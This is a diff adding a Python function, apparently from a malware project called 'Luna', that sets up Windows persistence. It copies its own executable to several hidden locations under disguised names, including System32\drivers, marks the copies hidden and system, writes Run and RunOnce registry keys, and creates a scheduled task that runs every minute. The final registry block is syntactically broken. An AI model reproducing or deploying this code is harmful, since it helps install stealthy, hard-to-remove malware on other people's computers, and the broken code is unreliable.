@@ -1,0 +1,70 @@
+def startup():
+    """
+    Comprehensive persistence engine implementing multi-path redundancy, 
+    registry-based auto-start, and system-level integration.
+    """
+    try:
+        # Determine the current executable path for replication
+        # Handles both compiled (PyInstaller) and raw script execution
+        source_path = sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(sys.argv[0])
+        
+        # Low-level Windows API for file attributes
+        kernel32 = ctypes.windll.kernel32
+        
+        # --- 1. EXTENDED PATH REDUNDANCY (Shadow Copies) ---
+        # Targets diverse directories to ensure at least one copy survives cleanup
+        target_paths = [
+            os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "sys_update.exe"),
+            os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Windows", "Cursors", ".system", "luna_helper.exe"),
+            os.path.join(os.getenv("USERPROFILE", ""), "Documents", ".config", "update_svc.exe"),
+            os.path.join(os.getenv("APPDATA", ""), ".config", "Microsoft", "SystemData", "luna_svc.exe"),
+            os.path.join(os.getenv("TEMP", ""), ".sys", "cache_helper.exe"),
+            os.path.join(os.getenv("USERPROFILE", ""), ".data", "cache", "helper.exe")
+        ]
+        
+        # Note: System32 requires Administrative privileges; handled by try-except
+        target_paths.append(os.path.join(os.getenv("WINDIR", "C:\\Windows"), "System32", "drivers", "luna_core.sys"))
+ 
+        for path in target_paths:
+            try:
+                # Ensure directory exists
+                os.makedirs(os.path.dirname(path), exist_ok=True)
+                # Copy binary to target
+                shutil.copy2(source_path, path)
+                # Set attributes to Hidden (2) and System (4) to hide from standard Explorer view
+                kernel32.SetFileAttributesW(path, 0x02 | 0x04)
+            except Exception:
+                continue
+ 
+        # --- 2. MULTI-VECTOR REGISTRY PERSISTENCE ---
+        # HKCU is used for non-privileged execution; HKLM is attempted for system-wide persistence
+        reg_vectors = [
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "LunaUpdate"),
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "LunaSystemSvc"),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "LunaBoot")
+        ]
+        
+        for root, path, name in reg_vectors:
+            try:
+                key = winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE)
+                # Point the registry key to one of the hidden copies (first one in list)
+                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, target_paths[0])
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+ 
+        # --- 3. SCHEDULED TASK PERSISTENCE (T1053.005) ---
+        # Creates a task that triggers every minute as a heartbeat/fallback
+        try:
+            task_name = "LunaSysMaintenance"
+            # Use /f to force create/overwrite existing task
+            cmd = f'schtasks /create /tn "{task_name}" /tr "{target_paths[0]}" /sc minute /mo 1 /f'
+            subprocess.run(cmd, shell=True, capture_output=True)
+        except Exception:
+            pass
+ 
+        # --- 4. REDUNDANT REGISTRY WRITE ---
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key_handle: "LunaSysCore", 0, winreg.REG_SZ, target_paths[0])
+    except Exception:
+        pass
